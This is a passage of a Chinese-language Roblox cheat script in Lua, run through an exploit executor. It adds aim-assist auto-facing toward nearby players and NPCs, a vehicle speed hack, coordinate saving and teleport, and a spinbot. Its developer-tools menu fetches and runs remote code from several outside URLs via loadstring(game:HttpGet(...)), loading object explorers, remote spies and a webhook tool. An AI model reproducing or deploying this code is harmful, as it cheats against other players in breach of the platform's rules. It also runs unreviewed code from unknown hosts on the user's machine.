            self.MSText.TextColor3 = Color3.new(0, 255, 255)
            self.MSText.TextSize = 25
            self.MSText.Font = Enum.Font.SourceSansBold
            self.MSText.TextXAlignment = Enum.TextXAlignment.Right
        end
        
        self.FPSText.Visible = self.FPSVisible
        self.MSText.Visible = self.MSVisible
        
        if self.FPSVisible and self.MSVisible then
            self.FPSText.Position = UDim2.new(1, -210, 0, 2)
            self.MSText.Position = UDim2.new(1, -210, 0, 37)
        elseif self.FPSVisible then
            self.FPSText.Position = UDim2.new(1, -210, 0, 2)
        elseif self.MSVisible then
            self.MSText.Position = UDim2.new(1, -210, 0, 2)
        end
        
        if not self.UpdateConnection then
            self.LastTime = tick()
            self.FPSCount = 0
            
            self.UpdateConnection = game:GetService("RunService").RenderStepped:Connect(function()
                self.FPSCount = self.FPSCount + 1
                local currentTime = tick()
                local delta = currentTime - self.LastTime
                
                if delta >= 0.5 then
                    local fps = self.FPSCount / delta
                    local ms = (delta / self.FPSCount) * 1000
                    
                    if self.FPSVisible and self.FPSText then
                        self.FPSText.Text = string.format("FPS: %.1f", fps)
                        if fps >= 60 then
                            self.FPSText.TextColor3 = Color3.new(0, 1, 0)
                        elseif fps >= 30 then
                            self.FPSText.TextColor3 = Color3.new(1, 1, 0)
                        else
                            self.FPSText.TextColor3 = Color3.new(1, 0, 0)
                        end
                    end
                    
                    if self.MSVisible and self.MSText then
                        self.MSText.Text = string.format("MS: %.1f", ms)
                        if ms <= 16 then
                            self.MSText.TextColor3 = Color3.new(0, 1, 0)
                        elseif ms <= 33 then
                            self.MSText.TextColor3 = Color3.new(1, 1, 0)
                        else
                            self.MSText.TextColor3 = Color3.new(1, 0, 0)
                        end
                    end
                    
                    self.FPSCount = 0
                    self.LastTime = currentTime
                end
            end)
        end
    else
        if self.UpdateConnection then
            self.UpdateConnection:Disconnect()
            self.UpdateConnection = nil
        end
        if self.DisplayGui then
            self.DisplayGui:Destroy()
            self.DisplayGui = nil
            self.FPSText = nil
            self.MSText = nil
        end
        self.LastTime = nil
        self.FPSCount = 0
    end
end

function FPSModule:Init()
    self.LastTime = tick()
    self.FPSCount = 0
end

FPSModule:Init()

game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
    if FPSModule.UpdateConnection then
        FPSModule.UpdateConnection:Disconnect()
        FPSModule.UpdateConnection = nil
    end
    if FPSModule.LockLoop then
        FPSModule.LockLoop:Disconnect()
        FPSModule.LockLoop = nil
    end
    if FPSModule.DisplayGui then
        FPSModule.DisplayGui:Destroy()
        FPSModule.DisplayGui = nil
    end
    FPSModule.LastTime = nil
    FPSModule.FPSCount = 0
end)

local about = PIJIAOBEN:section("自动朝向", false)

local plr = game:GetService("Players").LocalPlayer
local char = nil
local flags = {
    rotation = false
}

local settings = {
    attackRange = 15
}

local verification = {
    teamCheck = false,
    aliveCheck = false,
    friendCheck = false,
    wallCheck = false,
    npcCheck = false  
}

local Players = game:GetService("Players")
local CollectionService = game:GetService("CollectionService")
local RunService = game:GetService("RunService")

local connection = nil

local function isNPC(target)
    if Players:GetPlayerFromCharacter(target) then
        return false
    end
    
    if CollectionService:HasTag(target, "NPC") or 
       CollectionService:HasTag(target, "npc") or
       CollectionService:HasTag(target, "Enemy") or
       CollectionService:HasTag(target, "enemy") then
        return true
    end
    
    local name = target.Name:lower()
    if name:find("npc") or 
       name:find("enemy") or 
       name:find("怪物") or 
       name:find("boss") or
       name:find("mob") then
        return true
    end
   
    local humanoid = target:FindFirstChildOfClass("Humanoid")
    if humanoid then
        if humanoid:GetAttribute("IsNPC") or
           humanoid:GetAttribute("isNPC") then
            return true
        end
      
        if not Players:GetPlayerFromCharacter(target) then
            local hasPlayerController = false
            for _, descendant in ipairs(target:GetDescendants()) do
                if descendant:IsA("PlayerController") or
                   descendant:IsA("Controller") then
                    hasPlayerController = true
                    break
                end
            end
            if not hasPlayerController then
                return true
            end
        end
    end
    
    return false
end

local function Distance(target)
    if not char or not char:FindFirstChild("HumanoidRootPart") then 
        return math.huge 
    end
    local targetPart = target.PrimaryPart or target:FindFirstChild("HumanoidRootPart")
    if not targetPart then return math.huge end
    return (char.HumanoidRootPart.Position - targetPart.Position).magnitude
end

local function isFriend(targetPlayer)
    local success, result = pcall(function()
        return plr:IsFriendsWith(targetPlayer.UserId)
    end)
    return success and result
end

local function isDead(targetPlayer)
    local targetChar = targetPlayer.Character
    if not targetChar or not targetChar:FindFirstChildOfClass("Humanoid") then
        return true
    end
    return targetChar.Humanoid.Health <= 0
end

local function isSameTeam(targetPlayer)
    return plr.Team and targetPlayer.Team and plr.Team == targetPlayer.Team
end

local function isWallBetween(targetPlayer)
    if not verification.wallCheck then return false end
    
    local targetChar = targetPlayer.Character
    if not targetChar then return false end
    
    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
    if not targetRoot then return false end
    
    if not char then return false end
    
    local rayOrigin = char.HumanoidRootPart.Position
    local direction = (targetRoot.Position - rayOrigin)
    local rayDistance = direction.Magnitude
    direction = direction.Unit
    
    local ignoreList = {char, targetChar}
    
    for _, descendant in ipairs(char:GetDescendants()) do
        if descendant:IsA("BasePart") then
            table.insert(ignoreList, descendant)
        end
    end
    
    for _, descendant in ipairs(targetChar:GetDescendants()) do
        if descendant:IsA("BasePart") then
            table.insert(ignoreList, descendant)
        end
    end
    
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = ignoreList
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.IgnoreWater = true
    
    local raycastResult = workspace:Raycast(rayOrigin, direction * rayDistance, raycastParams)
    
    return raycastResult ~= nil
end

local function shouldSkipTarget(targetPlayer)
    if targetPlayer == plr then
        return true
    end
    
    if verification.teamCheck and isSameTeam(targetPlayer) then
        return true
    end
    
    if verification.friendCheck and isFriend(targetPlayer) then
        return true
    end
    
    if verification.aliveCheck and isDead(targetPlayer) then
        return true
    end
    
    if verification.wallCheck and isWallBetween(targetPlayer) then
        return true
    end
    
    return false
end

local function scanForNPCs()
    local npcs = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") and obj ~= char then
            local humanoid = obj:FindFirstChildOfClass("Humanoid")
            local rootPart = obj:FindFirstChild("HumanoidRootPart") or obj.PrimaryPart
            if humanoid and rootPart and humanoid.Health > 0 then
                if isNPC(obj) then
                    table.insert(npcs, obj)
                end
            end
        end
    end
    return npcs
end

task.spawn(function()
    while not char do
        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            char = plr.Character
        else
            task.wait(0.1)
        end
    end
end)

plr.CharacterAdded:Connect(function(newChar)
    char = newChar
end)

about:Toggle("开启/关闭自动朝向", "", false, function(Value)
    flags.rotation = Value
    
    if Value then
        connection = RunService.Heartbeat:Connect(function()
            if not flags.rotation or not char or not char:FindFirstChild("HumanoidRootPart") then return end
            
            pcall(function()
                for _, player in pairs(Players:GetPlayers()) do
                    if not shouldSkipTarget(player) then
                        local targetChar = player.Character
                        if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                            if Distance(targetChar) <= settings.attackRange then  
                                local humanoid = char:FindFirstChildOfClass("Humanoid")
                                if humanoid then
                                    local wasAutoRotate = humanoid.AutoRotate
                                    humanoid.AutoRotate = false
                                    local pos = targetChar.HumanoidRootPart.Position
                                    char.HumanoidRootPart.CFrame = CFrame.lookAt(
                                        char.HumanoidRootPart.Position,
                                        Vector3.new(pos.X, char.HumanoidRootPart.Position.Y, pos.Z)
                                    )
                                    humanoid.AutoRotate = wasAutoRotate
                                end
                            end
                        end
                    end
                end
                
                if verification.npcCheck then
                    local npcs = scanForNPCs()
                    for _, npc in ipairs(npcs) do
                        local rootPart = npc:FindFirstChild("HumanoidRootPart") or npc.PrimaryPart
                        if rootPart and Distance(npc) <= settings.attackRange then
                            local humanoid = char:FindFirstChildOfClass("Humanoid")
                            if humanoid then
                                local wasAutoRotate = humanoid.AutoRotate
                                humanoid.AutoRotate = false
                                local pos = rootPart.Position
                                char.HumanoidRootPart.CFrame = CFrame.lookAt(
                                    char.HumanoidRootPart.Position,
                                    Vector3.new(pos.X, char.HumanoidRootPart.Position.Y, pos.Z)
                                )
                                humanoid.AutoRotate = wasAutoRotate
                            end
                        end
                    end
                end
            end)
        end)
    else
        if connection then
            connection:Disconnect()
            connection = nil
        end
    end
end)

about:Textbox("设置自动朝向范围", '', "输入", function(Value)
    local num = tonumber(Value)
    if num and num > 0 then
        settings.attackRange = num
    end
end)

about:Toggle("团队验证", "SkipTeam", false, function(Value)
    verification.teamCheck = Value
end)

about:Toggle("活体验证", "SkipDead", false, function(Value)
    verification.aliveCheck = Value
end)

about:Toggle("好友验证", "SkipFriends", false, function(Value)
    verification.friendCheck = Value
end)

about:Toggle("墙壁验证", "SkipWalls", false, function(Value)
    verification.wallCheck = Value
end)

about:Toggle("朝向NPC", "NPC Check", false, function(Value)
    verification.npcCheck = Value
end)

local ToolTestVersion = PIJIAOBEN:section("开发工具", false)

ToolTestVersion:Button("控制台", function()
game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
end)
ToolTestVersion:Button("汉化版Dex", function()
loadstring(game:HttpGet("https://gitee.com/cmbhbh/cmbh/raw/master/Bex.lua"))()
end)
ToolTestVersion:Button("DEX-ExplorerV1 Mobile", function()
getgenv().Key = "Bash"
loadstring(game:HttpGet("https://raw.githubusercontent.com/crceck123/roblox-script/main/MC_IY%20Dex.txt"))()
end)
ToolTestVersion:Button("DEX-ExplorerV1 Mobile", function()
loadstring(game:HttpGet("https://github.com/XiaoYunCN/VIP/raw/main/DEX-Explorer_Mobile.lua", true))()
end)
ToolTestVersion:Button("DEX-ExplorerV2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/Tools/Dex-ExplorerV2.lua", true))()
end)
ToolTestVersion:Button("DEX-V3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/Tools/DarkDexV3.lua", true))()
end)
ToolTestVersion:Button("SimpleSpy", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlIlIlIlIlIlIlIlIlIlIlIlIlIlIlIl/Script/main/Tools/SimpleSpyMobile.lua", true))()
end)
ToolTestVersion:Button("FrostHook_Spy", function()
loadstring(game:HttpGet("https://github.com/Nootchtai/FrostHook_Spy/raw/master/Spy.lua", true))()
end)
ToolTestVersion:Button("WebHook工具", function()
loadstring(game:HttpGet("https://github.com/XiaoYunUwU/XiaoYunUwU/raw/main/WebhookTool", true))()
end)

local about = PIJIAOBEN:section("车辆加速", false)

local run = function(func) func() end

run(function()
    _G.VehicleAccelConfig = {
        enabled = false,
        fixedGui = false,
        accelerating = false,
        currentSpeed = 0,
        maxSpeed = 300,
        accelRate = 5,
        decelRate = 10,
        button = nil,
        border = nil,
        connection = nil,
        screenGui = nil
    }
end)

run(function()
    _G.VehicleAccelServices = {
        RunService = game:GetService("RunService"),
        Players = game:GetService("Players"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        CoreGui = game:GetService("CoreGui")
    }
end)

run(function()
    local getRainbowColor = function()
        local hue = (tick() % 5) / 5
        return Color3.fromHSV(hue, 1, 1)
    end
    
    _G.VehicleAccelUI = {
        createButton = function(screenGui)
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 90, 0, 50)
            button.Position = UDim2.new(0.5, 250, 1, -210)
            button.AnchorPoint = Vector2.new(0.5, 1)
            button.Text = "加速"
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 24
            button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            button.BackgroundTransparency = 0.5
            button.TextColor3 = Color3.new(1, 1, 1)
            button.Parent = screenGui
            button.Draggable = not _G.VehicleAccelConfig.fixedGui
            button.Visible = _G.VehicleAccelConfig.enabled
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 8)
            corner.Parent = button
            
            local border = Instance.new("Frame")
            border.Size = UDim2.new(1, 4, 1, 4)
            border.Position = UDim2.new(0, -2, 0, -2)
            border.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            border.BorderSizePixel = 0
            border.Parent = button
            border.ZIndex = 0
            
            local borderCorner = Instance.new("UICorner")
            borderCorner.CornerRadius = UDim.new(0, 10)
            borderCorner.Parent = border
            
            spawn(function()
                while border and border.Parent do
                    border.BackgroundColor3 = getRainbowColor()
                    wait(0.1)
                end
            end)
            
            button.MouseButton1Down:Connect(function()
                _G.VehicleAccelConfig.accelerating = true
            end)
            
            button.MouseButton1Up:Connect(function()
                _G.VehicleAccelConfig.accelerating = false
            end)
            
            _G.VehicleAccelConfig.button = button
            _G.VehicleAccelConfig.border = border
        end,
        
        destroyButton = function()
            if _G.VehicleAccelConfig.button then
                _G.VehicleAccelConfig.button:Destroy()
                _G.VehicleAccelConfig.button = nil
                _G.VehicleAccelConfig.border = nil
            end
        end,
        
        setVisible = function(visible)
            if _G.VehicleAccelConfig.button then
                _G.VehicleAccelConfig.button.Visible = visible
            end
        end,
        
        setDraggable = function(draggable)
            if _G.VehicleAccelConfig.button then
                _G.VehicleAccelConfig.button.Draggable = draggable
            end
        end,
        
        createGui = function()
            if _G.VehicleAccelConfig.screenGui then
                _G.VehicleAccelConfig.screenGui:Destroy()
            end
            
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "VehicleAccelGui"
            screenGui.Parent = _G.VehicleAccelServices.CoreGui
            _G.VehicleAccelConfig.screenGui = screenGui
            
            _G.VehicleAccelUI.createButton(screenGui)
        end,
        
        destroyGui = function()
            if _G.VehicleAccelConfig.screenGui then
                _G.VehicleAccelConfig.screenGui:Destroy()
                _G.VehicleAccelConfig.screenGui = nil
                _G.VehicleAccelConfig.button = nil
                _G.VehicleAccelConfig.border = nil
            end
        end
    }
end)

run(function()
    local RunService = _G.VehicleAccelServices.RunService
    local LocalPlayer = _G.VehicleAccelServices.LocalPlayer
    
    _G.VehicleAccelCore = {
        update = function(dt)
            local character = LocalPlayer.Character
            if not character then return end
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then return end
            
            local seatPart = humanoid.SeatPart
            if not seatPart then return end
            
            local vehicle = seatPart:FindFirstAncestorOfClass("Model")
            if not vehicle then return end
            
            local part = vehicle.PrimaryPart or vehicle:FindFirstChildWhichIsA("BasePart", true)
            if not part then return end
            
            local config = _G.VehicleAccelConfig
            
            if config.accelerating then
                config.currentSpeed = math.clamp(config.currentSpeed + config.accelRate, 0, config.maxSpeed)
                if config.button then
                    config.button.Text = tostring(math.floor(config.currentSpeed))
                end
            elseif config.currentSpeed > 0 then
                config.currentSpeed = math.max(0, config.currentSpeed - config.decelRate)
                if config.button then
                    config.button.Text = tostring(math.floor(config.currentSpeed))
                end
            end
            
            if config.currentSpeed > 0 then
                local velocity = part.AssemblyLinearVelocity
                local lookVector = seatPart.CFrame.LookVector
                part.AssemblyLinearVelocity = velocity + (lookVector * (config.currentSpeed * dt))
            end
        end,
        
        start = function()
            if _G.VehicleAccelConfig.connection then
                _G.VehicleAccelConfig.connection:Disconnect()
            end
            _G.VehicleAccelConfig.connection = RunService.RenderStepped:Connect(function(dt)
                if _G.VehicleAccelConfig.enabled then
                    _G.VehicleAccelCore.update(dt)
                end
            end)
        end,
        
        stop = function()
            if _G.VehicleAccelConfig.connection then
                _G.VehicleAccelConfig.connection:Disconnect()
                _G.VehicleAccelConfig.connection = nil
            end
        end
    }
end)

run(function()
    _G.VehicleAccelUI.createGui()
    
    about:Toggle("车辆加速", "Toggle", false, function(Value)
        _G.VehicleAccelConfig.enabled = Value
        _G.VehicleAccelUI.setVisible(Value)
        
        if Value then
            _G.VehicleAccelCore.start()
        else
            _G.VehicleAccelCore.stop()
            _G.VehicleAccelConfig.accelerating = false
            _G.VehicleAccelConfig.currentSpeed = 0
            if _G.VehicleAccelConfig.button then
                _G.VehicleAccelConfig.button.Text = "加速"
            end
        end
    end)
    
    about:Toggle("固定加速按钮", "FixGui", false, function(Value)
        _G.VehicleAccelConfig.fixedGui = Value
        _G.VehicleAccelUI.setDraggable(not Value)
    end)
    
    about:Textbox("最大速度", "MaxSpeed", "300", function(value)
        local num = tonumber(value)
        if num and num > 0 then
            _G.VehicleAccelConfig.maxSpeed = num
        end
    end)
    
    about:Textbox("每帧加速速度", "AccelRate", "5", function(value)
        local num = tonumber(value)
        if num and num > 0 then
            _G.VehicleAccelConfig.accelRate = num
        end
    end)
    
    about:Textbox("每帧减速速度", "DecelRate", "10", function(value)
        local num = tonumber(value)
        if num and num > 0 then
            _G.VehicleAccelConfig.decelRate = num
        end
    end)
end)

run(function()
    local Players = _G.VehicleAccelServices.Players
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        _G.VehicleAccelConfig.accelerating = false
        _G.VehicleAccelConfig.currentSpeed = 0
        if _G.VehicleAccelConfig.button then
            _G.VehicleAccelConfig.button.Text = "加速"
        end
    end)
end)

local SaveSection = PIJIAOBEN:section("坐标", false)

local run = function(func) func() end

run(function()
    _G.CoordConfig = {
        tempCoord = "",
        tempPos = {x = 0, y = 0, z = 0},
        inputName = "",
        importInput = "",
        manualInput = "",
        folderName = "坐标记录",
        savedCoordinates = {},
        buttonHistory = {}
    }
end)

run(function()
    _G.CoordServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        StarterGui = game:GetService("StarterGui"),
        HttpService = game:GetService("HttpService")
    }
end)

run(function()
    local folderName = _G.CoordConfig.folderName
    
    _G.CoordFile = {
        init = function()
            if not isfolder(folderName) then
                makefolder(folderName)
            end
        end,
        
        getCoordinateList = function()
            local files = listfiles(folderName)
            local coords = {}
            for _, file in ipairs(files) do
                local name = file:match("([^\\/]+)%.txt$")
                if name then
                    local content = readfile(file)
                    local x, y, z = content:match("([%-%d%.]+),?%s*([%-%d%.]+),?%s*([%-%d%.]+)")
                    if x and y and z then
                        table.insert(coords, {
                            name = name,
                            x = tonumber(x),
                            y = tonumber(y),
                            z = tonumber(z),
                            file = file
                        })
                    end
                end
            end
            return coords
        end,
        
        saveCoordinate = function(name, pos)
            local filePath = folderName .. "/" .. name .. ".txt"
            if isfile(filePath) then
                return false, "坐标名称已存在"
            end
            writefile(filePath, string.format("%.2f,%.2f,%.2f", pos.X, pos.Y, pos.Z))
            return true, "保存成功"
        end,
        
        quickSave = function(pos)
            local timeStr = os.date("%Y%m%d_%H%M%S")
            local fileName = "坐标_" .. timeStr
            local filePath = folderName .. "/" .. fileName .. ".txt"
            writefile(filePath, string.format("%.2f,%.2f,%.2f", pos.X, pos.Y, pos.Z))
            return fileName
        end,
        
        deleteCoordinate = function(name)
            local filePath = folderName .. "/" .. name .. ".txt"
            if isfile(filePath) then
                delfile(filePath)
                return true
            end
            return false
        end,
        
        updateCoordinate = function(name, pos)
            local filePath = folderName .. "/" .. name .. ".txt"
            if isfile(filePath) then
                writefile(filePath, string.format("%.2f,%.2f,%.2f", pos.X, pos.Y, pos.Z))
                return true
            end
            return false
        end
    }
end)

run(function()
    local LocalPlayer = _G.CoordServices.LocalPlayer
    
    _G.CoordTeleport = {
        teleportToPos = function(targetPos)
            local character = LocalPlayer.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    rootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                    return true
                end
            end
            return false
        end,
        
        getCurrentPos = function()
            local character = LocalPlayer.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    local pos = rootPart.Position
                    return pos.X, pos.Y, pos.Z
                end
            end
            return nil, nil, nil
        end
    }
end)

run(function()
    local function sendNotification(title, text, isError)
        local notification = {
            Title = title or "皮脚本",
            Text = text,
            Icon = "rbxassetid://136169594232359",
            Duration = 3
        }
        
        if isError then
            notification.Title = "错误"
            notification.Text = text
        end
        
        if XPHUBNotification and XPHUBNotification.Notification then
            XPHUBNotification:Notification(notification)
        end
    end
    
    _G.CoordNotification = {
        success = function(text)
            sendNotification("皮脚本", text)
        end,
        
        error = function(text)
            sendNotification("错误", text, true)
        end,
        
        info = function(text)
            sendNotification("提示", text)
        end
    }
end)

run(function()
    local LocalPlayer = _G.CoordServices.LocalPlayer
    local RunService = _G.CoordServices.RunService
    local folderName = _G.CoordConfig.folderName
    local SaveSection = SaveSection
    local ListSection = ListSection
    
    _G.CoordFile.init()
    
    local coordDisplay = SaveSection:Label("当前坐标: 获取中...")
    
    local function updateCurrentCoord()
        local x, y, z = _G.CoordTeleport.getCurrentPos()
        if x and y and z then
            _G.CoordConfig.tempPos = {x = x, y = y, z = z}
            coordDisplay.Text = string.format("当前坐标: X:%.1f Y:%.1f Z:%.1f", x, y, z)
        else
            coordDisplay.Text = "当前坐标: 无法获取"
        end
    end
    
    updateCurrentCoord()
    
    RunService.RenderStepped:Connect(function()
        updateCurrentCoord()
    end)
    
    SaveSection:Button("复制当前坐标", function()
        local x, y, z = _G.CoordTeleport.getCurrentPos()
        if x and y and z then
            local coordText = string.format("%.2f, %.2f, %.2f", x, y, z)
            setclipboard(coordText)
            _G.CoordNotification.success("坐标已复制")
        else
            _G.CoordNotification.error("请先获取坐标")
        end
    end)
    
    SaveSection:Textbox("位置名", "输入名字", "输入位置名称(留空自动命名)", function(val)
        _G.CoordConfig.inputName = val
    end)
    
    SaveSection:Button("保存位置", function()
        local x, y, z = _G.CoordTeleport.getCurrentPos()
        if not x or not y or not z then
            _G.CoordNotification.error("无法获取当前位置")
            return
        end
        
        local name = _G.CoordConfig.inputName
        if name == "" then
            local timeStr = os.date("%H%M%S")
            name = "坐标_" .. timeStr
        end
        
        local success, msg = _G.CoordFile.saveCoordinate(name, Vector3.new(x, y, z))
        if success then
            _G.CoordNotification.success("已保存: " .. name)
            _G.CoordConfig.inputName = ""
        else
            _G.CoordNotification.error(msg)
        end
    end)
    
    SaveSection:Button("快速保存", function()
        local x, y, z = _G.CoordTeleport.getCurrentPos()
        if x and y and z then
            local fileName = _G.CoordFile.quickSave(Vector3.new(x, y, z))
            _G.CoordNotification.success("快速保存: " .. fileName)
        else
            _G.CoordNotification.error("无法获取当前位置")
        end
    end)
    
    SaveSection:Textbox("删除位置名", "删除名字", "输入要删除的位置名称", function(val)
        _G.CoordConfig.inputName = val
    end)
    
    SaveSection:Button("删除位置", function()
        if _G.CoordConfig.inputName == "" then
            _G.CoordNotification.error("请输入要删除的位置名称")
            return
        end
        
        local success = _G.CoordFile.deleteCoordinate(_G.CoordConfig.inputName)
        if success then
            _G.CoordNotification.success("已删除: " .. _G.CoordConfig.inputName)
            _G.CoordConfig.inputName = ""
        else
            _G.CoordNotification.error("未找到文件: " .. _G.CoordConfig.inputName)
        end
    end)
    
    SaveSection:Button("导出所有坐标", function()
        local coords = _G.CoordFile.getCoordinateList()
        if #coords == 0 then
            _G.CoordNotification.error("没有保存的坐标")
            return
        end
        
        local exportData = {}
        for _, coord in ipairs(coords) do
            table.insert(exportData, string.format("%s: %.2f,%.2f,%.2f", coord.name, coord.x, coord.y, coord.z))
        end
        
        local exportText = table.concat(exportData, "\n")
        setclipboard(exportText)
        _G.CoordNotification.success("已导出 " .. #coords .. " 个坐标到剪贴板")
    end)
    
    SaveSection:Button("清空所有坐标", function()
        local coords = _G.CoordFile.getCoordinateList()
        if #coords == 0 then
            _G.CoordNotification.error("没有保存的坐标")
            return
        end
        
        for _, coord in ipairs(coords) do
            _G.CoordFile.deleteCoordinate(coord.name)
        end
        _G.CoordNotification.success("已清空 " .. #coords .. " 个坐标")
    end)
    
    SaveSection:Textbox("导入坐标", "导入坐标", "名称 X,Y,Z", function(val)
        _G.CoordConfig.importInput = val
    end)
    
    SaveSection:Button("导入单个坐标", function()
        if not _G.CoordConfig.importInput or _G.CoordConfig.importInput == "" then
            _G.CoordNotification.error("请输入: 名称 X,Y,Z")
            return
        end
        
        local name, x, y, z = _G.CoordConfig.importInput:match("([^%s]+)%s+([%-%d%.]+),([%-%d%.]+),([%-%d%.]+)")
        if name and x and y and z then
            local success, msg = _G.CoordFile.saveCoordinate(name, Vector3.new(tonumber(x), tonumber(y), tonumber(z)))
            if success then
                _G.CoordNotification.success("已导入: " .. name)
            else
                _G.CoordNotification.error(msg)
            end
        else
            _G.CoordNotification.error("格式错误，请使用: 名称 X,Y,Z")
        end
    end)
    
    local function loadButtons()
        local coords = _G.CoordFile.getCoordinateList()
        
        for _, coord in ipairs(coords) do
            if not _G.CoordConfig.buttonHistory[coord.name] then
                _G.CoordConfig.buttonHistory[coord.name] = true
                ListSection:Button("传送: " .. coord.name .. " (" .. coord.x .. "," .. coord.y .. "," .. coord.z .. ")", function()
                    local success = _G.CoordTeleport.teleportToPos(Vector3.new(coord.x, coord.y, coord.z))
                    if success then
                        _G.CoordNotification.success("已传送到: " .. coord.name)
                    else
                        _G.CoordNotification.error("传送失败，角色不存在")
                    end
                end)
            end
        end
    end
    
    SaveSection:Button("刷新列表", function()
        loadButtons()
        _G.CoordNotification.success("列表已刷新")
    end)
    
    SaveSection:Button("传送到当前位置", function()
        local x, y, z = _G.CoordTeleport.getCurrentPos()
        if x and y and z then
            _G.CoordTeleport.teleportToPos(Vector3.new(x, y, z))
            _G.CoordNotification.success("已传送到当前位置")
        else
            _G.CoordNotification.error("无法获取当前位置")
        end
    end)
    
    SaveSection:Textbox("输入坐标传送", "输入坐标", "X Y Z 或 X,Y,Z", function(val)
        _G.CoordConfig.manualInput = val
    end)
    
    SaveSection:Button("传送到输入坐标", function()
        if not _G.CoordConfig.manualInput or _G.CoordConfig.manualInput == "" then
            _G.CoordNotification.error("请输入坐标")
            return
        end
        
        local x, y, z = _G.CoordConfig.manualInput:match("([%-%d%.]+)[%s,]+([%-%d%.]+)[%s,]+([%-%d%.]+)")
        if x and y and z then
            local success = _G.CoordTeleport.teleportToPos(Vector3.new(tonumber(x), tonumber(y), tonumber(z)))
            if success then
                _G.CoordNotification.success(string.format("已传送到 (%.1f, %.1f, %.1f)", tonumber(x), tonumber(y), tonumber(z)))
            else
                _G.CoordNotification.error("传送失败")
            end
        else
            _G.CoordNotification.error("格式错误，请使用: X Y Z 或 X,Y,Z")
        end
    end)
    
    pcall(loadButtons)
end)

local PIJIAOBEN = XIAOPI:Tab("旋转与范围","136169594232359")

local about = PIJIAOBEN:section("旋转", false)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local bin = {
    speed = 100,
    spinbotActive = false,
    connection = nil,
    direction = 1,
    axis = "Y" 
}

about:Textbox("设置旋转速度", 'TextBoxFlag', "输入", function(Value)
    bin.speed = tonumber(Value) or 100
    if bin.spinbotActive then
        local plr = Players.LocalPlayer
        if plr.Character then
            local spinbot = plr.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Spinbot")
            if spinbot then
                local velocity = Vector3.new(0, 0, 0)
                if bin.axis == "X" then
                    velocity = Vector3.new(bin.speed * bin.direction, 0, 0)
                elseif bin.axis == "Y" then
                    velocity = Vector3.new(0, bin.speed * bin.direction, 0)
                elseif bin.axis == "Z" then
                    velocity = Vector3.new(0, 0, bin.speed * bin.direction)
                end
                spinbot.AngularVelocity = velocity
            end
        end
    end
end)

about:Dropdown("旋转方向", "", {
    "顺时针",
    "逆时针"
}, function(selectedDirection)
    if selectedDirection == "顺时针" then
        bin.direction = 1
    else
        bin.direction = -1
    end
    if bin.spinbotActive then
        local plr = Players.LocalPlayer
        if plr.Character then
            local spinbot = plr.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Spinbot")
            if spinbot then
                
                local velocity = Vector3.new(0, 0, 0)
                if bin.axis == "X" then
                    velocity = Vector3.new(bin.speed * bin.direction, 0, 0)
                elseif bin.axis == "Y" then
                    velocity = Vector3.new(0, bin.speed * bin.direction, 0)
                elseif bin.axis == "Z" then
                    velocity = Vector3.new(0, 0, bin.speed * bin.direction)
                end
                spinbot.AngularVelocity = velocity
            end
        end
    end
end)

about:Dropdown("旋转轴向", "", {
    "X 轴",
    "Y 轴",
    "Z 轴"
}, function(selectedAxis)
    if selectedAxis == "X 轴" then
        bin.axis = "X"
    elseif selectedAxis == "Y 轴" then
        bin.axis = "Y"
    elseif selectedAxis == "Z 轴" then
        bin.axis = "Z"
    end
    
    if bin.spinbotActive then
        local plr = Players.LocalPlayer
        if plr.Character then
            local spinbot = plr.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("Spinbot")
            if spinbot then
                
                local velocity = Vector3.new(0, 0, 0)
                if bin.axis == "X" then
                    velocity = Vector3.new(bin.speed * bin.direction, 0, 0)
                elseif bin.axis == "Y" then
                    velocity = Vector3.new(0, bin.speed * bin.direction, 0)
                elseif bin.axis == "Z" then
                    velocity = Vector3.new(0, 0, bin.speed * bin.direction)
                end
                spinbot.AngularVelocity = velocity
            end
        end
    end
end)

about:Toggle("开启/关闭旋转", "Spinbot", false, function(state)
    bin.spinbotActive = state
    local plr = Players.LocalPlayer
    
    if not plr.Character then
        plr.CharacterAdded:Wait()
    end
    
    local humanoid = plr.Character:WaitForChild("Humanoid")
    local humRoot = plr.Character:WaitForChild("HumanoidRootPart")
    
    humanoid.AutoRotate = not state
    
    if state then
        local existing = humRoot:FindFirstChild("Spinbot")
        if existing then existing:Destroy() end
        
      
        local velocity = Vector3.new(0, 0, 0)
        if bin.axis == "X" then
            velocity = Vector3.new(bin.speed * bin.direction, 0, 0)
        elseif bin.axis == "Y" then
            velocity = Vector3.new(0, bin.speed * bin.direction, 0)
        elseif bin.axis == "Z" then
            velocity = Vector3.new(0, 0, bin.speed * bin.direction)
        end
        
        local angVelocity = Instance.new("AngularVelocity")
